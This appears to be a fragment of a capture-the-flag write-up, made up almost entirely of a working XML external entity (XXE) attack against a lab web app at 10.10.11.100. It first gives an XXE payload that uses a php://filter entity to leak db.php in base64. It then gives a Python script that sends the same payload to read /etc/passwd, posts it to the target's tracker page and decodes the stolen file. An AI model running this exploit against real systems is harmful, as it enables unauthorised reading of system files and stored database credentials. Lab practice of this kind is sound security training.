```xml
<?xml  version="1.0" encoding="ISO-8859-1"?><!DOCTYPE replace [<!ENTITY example SYSTEM 'php://filter/convert.base64-encode/resource=db.php'>]>
		<bugreport>
		<title>&example;</title>
		<cwe>bbb</cwe>
		<cvss>ccc</cvss>
		<reward>ddd</reward>
```

##### Python exploit 
```python
import requests 
import base64 
fname = '/etc/passwd'
payload = f"""<?xml  version="1.0" encoding="ISO-8859-1"?><!DOCTYPE replace [<!ENTITY example SYSTEM 'php://filter/convert.base64-encode/resource={fname}'>]>
                <bugreport>
                <title>&example;</title>
                <cwe>bbb</cwe>
                <cvss>ccc</cvss>
                <reward>ddd</reward>
                </bugreport>""".encode()
payload_b64 = base64.b64encode(payload).decode()
data = { "data": payload_b64 }
r = requests.post('http://10.10.11.100/tracker_diRbPr00f314.php', data=data)
output = (r.text).split('>')[5][:-4]
print(base64.b64decode(output).decode())
```